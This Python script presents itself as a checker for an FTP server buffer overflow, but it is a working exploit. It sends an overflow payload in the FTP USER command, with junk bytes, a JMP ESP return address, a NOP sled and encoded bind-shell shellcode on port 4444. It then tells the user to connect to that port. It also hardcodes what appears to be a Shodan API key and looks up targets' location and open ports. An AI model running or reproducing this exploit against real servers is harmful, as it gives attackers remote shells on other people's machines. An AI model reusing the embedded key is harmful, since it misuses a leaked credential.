#!/usr/bin/env python
# -*- encoding: utf-8 -*-

#class for check FTP Server Buffer Overflow Vulnerability

import socket
import sys
import shodan

#Bind Shell shellcode port 4444 

shellcode = ("\x31\xc9\xdb\xcd\xbb\xb3\x93\x96\x9d\xb1\x56\xd9\x74\x24\xf4" "\x5a\x31\x5a\x17\x83\xea\xfc\x03\x5a\x13\x51\x66\x6a\x75\x1c" "\x89\x93\x86\x7e\x03\x76\xb7\xac\x77\xf2\xea\x60\xf3\x56\x07" "\x0b\x51\x43\x9c\x79\x7e\x64\x15\x37\x58\x4b\xa6\xf6\x64\x07" "\x64\x99\x18\x5a\xb9\x79\x20\x95\xcc\x78\x65\xc8\x3f\x28\x3e" "\x86\x92\xdc\x4b\xda\x2e\xdd\x9b\x50\x0e\xa5\x9e\xa7\xfb\x1f" "\xa0\xf7\x54\x14\xea\xef\xdf\x72\xcb\x0e\x33\x61\x37\x58\x38" "\x51\xc3\x5b\xe8\xa8\x2c\x6a\xd4\x66\x13\x42\xd9\x77\x53\x65" "\x02\x02\xaf\x95\xbf\x14\x74\xe7\x1b\x91\x69\x4f\xef\x01\x4a" "\x71\x3c\xd7\x19\x7d\x89\x9c\x46\x62\x0c\x71\xfd\x9e\x85\x74" "\xd2\x16\xdd\x52\xf6\x73\x85\xfb\xaf\xd9\x68\x04\xaf\x86\xd5" "\xa0\xbb\x25\x01\xd2\xe1\x21\xe6\xe8\x19\xb2\x60\x7b\x69\x80" "\x2f\xd7\xe5\xa8\xb8\xf1\xf2\xcf\x92\x45\x6c\x2e\x1d\xb5\xa4" "\xf5\x49\xe5\xde\xdc\xf1\x6e\x1f\xe0\x27\x20\x4f\x4e\x98\x80" "\x3f\x2e\x48\x68\x2a\xa1\xb7\x88\x55\x6b\xce\x8f\x9b\x4f\x82" "\x67\xde\x6f\x34\x2b\x57\x89\x5c\xc3\x31\x01\xc9\x21\x66\x9a" "\x6e\x5a\x4c\xb6\x27\xcc\xd8\xd0\xf0\xf3\xd8\xf6\x52\x58\x70" "\x91\x20\xb2\x45\x80\x36\x9f\xed\xcb\x0e\x77\x67\xa2\xdd\xe6" "\x78\xef\xb6\x8b\xeb\x74\x47\xc2\x17\x23\x10\x83\xe6\x3a\xf4" "\x39\x50\x95\xeb\xc0\x04\xde\xa8\x1e\xf5\xe1\x31\xd3\x41\xc6" "\x21\x2d\x49\x42\x16\xe1\x1c\x1c\xc0\x47\xf7\xee\xba\x11\xa4" "\xb8\x2a\xe4\x86\x7a\x2d\xe9\xc2\x0c\xd1\x5b\xbb\x48\xed\x53" "\x2b\x5d\x96\x8e\xcb\xa2\x4d\x0b\xfb\xe8\xcc\x3d\x94\xb4\x84" "\x7c\xf9\x46\x73\x42\x04\xc5\x76\x3a\xf3\xd5\xf2\x3f\xbf\x51" 
"\xee\x4d\xd0\x37\x10\xe2\xd1\x1d\x1a")

junk1 = "\x41" * 230 
eip = "\x7B\x46\x86\x7C" #7C86467B JMP ESP (findjmp.exe): 
nops = "\x90" * 16 
junk2 = "\x43" * (1000 - len(junk1 + eip + nops + shellcode)) 
buff = junk1 + eip + nops + shellcode + junk2 
        
class CheckFTPVulnerable:

    def __init__(self):
        #shodan key
        shodanKeyString = 'v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik'
        self.shodanApi = shodan.Shodan(shodanKeyString)
    
    def checkVulnerability(self,ip,port):
    
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print 'Connecting with ...' + ip + ' Port: '+ port
            sys.stdout.flush()
            s.connect((ip, int(port)))
            print 'Sending Client Request...'
            sys.stdout.flush()
            s.send('USER ' + buff + '\r\n') 
            print 'Waiting for Server Request...'
            s.close()
            print("[+] Server is vulnerable...")
            print("[+] Connect to " + ip + " on port 4444")
    
        except:
            print("[-] Connection error...") 
            print("[-] Check if host is up.")        
        
        
    def startCheckVulnerability(self,ip,hostname):
        try:
            
            #open socket for check port
            sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(10)
            
            #check if port 21 is open
            result = sock.connect_ex((ip,21))
            
            if result == 0:
                print "Port 21 open"
                
                print '\n###### Started scanning for checking FTP Server Buffer Overflow Vulnerability \'%s\' ######\n' % (ip)
                            
                #check FTP Server Buffer Overflow Vulnerability in port 21
                self.checkVulnerability(ip,'21')
                
                print '\n###### Started scanning for checking FTP Server Buffer Overflow Vulnerability \'%s\' ######\n' % (hostname)
                                       
                #check FTP Server Buffer Overflow Vulnerability in port 21
                self.checkVulnerability(hostname,'21')                
                    
            else:
                print "Port FTP 21 closed"            
            
            #close socket
            sock.close()
            
        except Exception, e:
                print 'Error connecting: %s' % e
        except socket.timeout:
                print 'Error connecting Timeouterror: %s' % e


    #Obtain info IP
    def obtain_host_info(self,IP):
        try:
                host = self.shodanApi.host(IP)
                if len(host) != 0:
                            # Print host info
                            print 'IP: %s' % host.get('ip_str')
                            print 'Country: %s' % host.get('country_name','Unknown')
                            print 'City: %s' % host.get('city','Unknown')
                            print 'Latitude: %s' % host.get('latitude')
                            print 'Longitude: %s' % host.get('longitude')
                            print 'Hostnames: %s' % host.get('hostnames')

                            for i in host['data']:
                                print 'Port: %s' % i['port']
                               
                            return host
        except shodan.APIError, e:
                print ' Error: %s' % e
                return host
